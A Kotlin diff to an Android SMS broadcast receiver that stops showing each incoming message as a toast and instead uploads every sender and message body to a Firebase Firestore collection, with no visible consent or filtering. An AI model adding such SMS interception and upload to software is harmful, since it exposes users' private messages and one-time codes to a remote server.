@@ -7,6 +7,8 @@ import android.os.Build
 import android.provider.Telephony
 import android.telephony.SmsMessage
 import android.util.Log
+import com.google.firebase.FirebaseApp
+import com.google.firebase.firestore.FirebaseFirestore
 
 /**
  * Created by minhnguyen on 3/27/18.
@@ -51,8 +53,8 @@ class SmsBroadcastReceiver() : BroadcastReceiver() {
                 }
             }
 
-            val pushMessage = smsSender + '\n' + smsBody
-            context.toast(pushMessage)
+
+            pushServer(context, smsSender, smsBody)
 
 //            if (smsSender == serviceProviderNumber && smsBody.startsWith(serviceProviderSmsCondition)) {
 //                if (listener != null) {
@@ -60,6 +62,18 @@ class SmsBroadcastReceiver() : BroadcastReceiver() {
 //                }
 //            }
         }
+    }
+
+    private fun pushServer(context: Context, smsSender: String, smsBody: String) {
+        FirebaseApp.initializeApp(context)
+        val db = FirebaseFirestore.getInstance()
+        val item = mutableMapOf<String, Any>()
+        item.put(smsSender, smsBody)
+
+        db.collection(AP.getStringData(context, Constant.KEY.ID))
+                .add(item)
+                .addOnSuccessListener { documentReference -> Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.id) }
+                .addOnFailureListener { e -> Log.w(TAG, "Error adding document", e) }
     }
 
     internal fun setListener(listener: Listener) {
